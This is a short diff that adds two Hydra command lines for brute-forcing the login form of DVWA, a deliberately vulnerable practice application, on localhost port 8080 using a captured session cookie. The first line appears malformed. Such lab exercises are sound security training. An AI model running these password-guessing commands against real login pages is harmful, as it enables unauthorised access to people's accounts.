@@ -1,0 +1,5 @@
+hydra -L users.txt -P passwords.txt 1 s 8080 dvwa.local http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=143b7c2da9eebbf4b5c6bed45005425d; security=low:F=incorrect"
+
+hydra -L users.txt -P passwords.txt localhost -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.,H=Cookie\: PHPSESSID=143b7c2da9eebbf4b5c6bed45005425d; security=low"
+
+
